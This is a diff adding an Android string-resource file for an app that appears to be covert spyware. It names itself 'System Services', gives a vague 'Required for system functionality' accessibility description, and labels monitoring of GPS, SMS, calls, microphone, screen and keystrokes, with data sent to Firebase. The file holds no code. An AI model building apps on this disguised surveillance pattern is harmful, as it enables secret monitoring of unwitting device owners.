@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">System Services</string>
+    <string name="accessibility_service_description">Required for system functionality</string>
+    
+    <!-- Cyberpunk Theme UI Elements -->
+    <string name="status_active">ACTIVE</string>
+    <string name="status_inactive">INACTIVE</string>
+    <string name="system_active">SYSTEM ACTIVE</string>
+    <string name="system_info">SYSTEM INFO</string>
+    <string name="services_running">Monitoring Services: RUNNING</string>
+    <string name="data_collection">Data Collection: ENABLED</string>
+    <string name="firebase_connection">Firebase Connection: SECURE</string>
+    <string name="secure_connection">SECURE CONNECTION ESTABLISHED</string>
+    
+    <!-- Service Labels -->
+    <string name="gps_service">GPS</string>
+    <string name="sms_service">SMS</string>
+    <string name="call_service">CALL</string>
+    <string name="mic_service">MIC</string>
+    <string name="screen_service">SCREEN</string>
+    <string name="keylog_service">KEYLOG</string>
+</resources>
